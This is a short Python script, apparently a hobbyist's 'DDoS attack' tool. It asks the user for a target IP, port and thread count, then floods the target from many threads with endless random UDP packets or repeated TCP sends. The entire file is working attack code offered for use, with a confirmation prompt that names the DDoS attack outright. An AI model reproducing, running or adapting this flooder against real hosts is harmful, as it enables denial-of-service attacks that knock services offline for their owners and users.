#!/usr/bin/env python3
#Code by LeeOn123
import argparse
import random
import socket
import threading
import time
import sys
import os
from colorama import init, Fore, Back, Style
os.system('cls')
# เริ่มใช้งาน colorama
init(autoreset=True)

# กำหนดสีและ ASCII art
ascii_art = f"""
{Fore.CYAN}  ███╗░░██╗░██████╗████████╗██╗░█████╗░███╗░░░███╗
{Fore.CYAN}  ████╗░██║██╔════╝╚══██╔══╝██║██╔══██╗████╗░████║
{Fore.CYAN}  ██╔██╗██║╚█████╗░░░░██║░░░██║██║░░██║██╔████╔██║
{Fore.CYAN}  ██║╚████║░╚═══██╗░░░██║░░░██║██║░░██║██║╚██╔╝██║
{Fore.CYAN}  ██║░╚███║██████╔╝░░░██║░░░██║╚█████╔╝██║░╚═╝░██║
{Fore.CYAN}  ╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░░░░╚═╝
"""

# พิมพ์ ASCII art และสี
print(ascii_art)



ip = input("Enter the IP: ")
port = int(input("Enter the Port: "))
choice = input("Enter the Choice: ")
times = int(input("Enter the Times: "))
threads = int(input("Enter the Threads: "))

while True:
    confirm_ip = input("Confirm this IP? (Y/N): ")
    if confirm_ip.lower() == "y":
        break
    elif confirm_ip.lower() == "n":
        ip = input("Enter the IP: ")
        port = int(input("Enter the Port: "))
        choice = input("Enter the Choice: ")
        times = int(input("Enter the Times: "))
        threads = int(input("Enter the Threads: "))
        break
    else:
        print("Please type Y or N.")

# Continue with the rest of your code using the entered IP, port, choice, times, and threads variables
# ...

while True:
    YorN = input("Do you want to start the DDos attack? (Y/N): ")
    if YorN.lower() == "n":
        print("Ok you don't want DDos attack")
        sys.exit()
    elif YorN.lower() == "y":
        print("Ok run DDos")
        break
    else:
        print("Please type Y or N.")

def run():
	data = random._urandom(2048)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
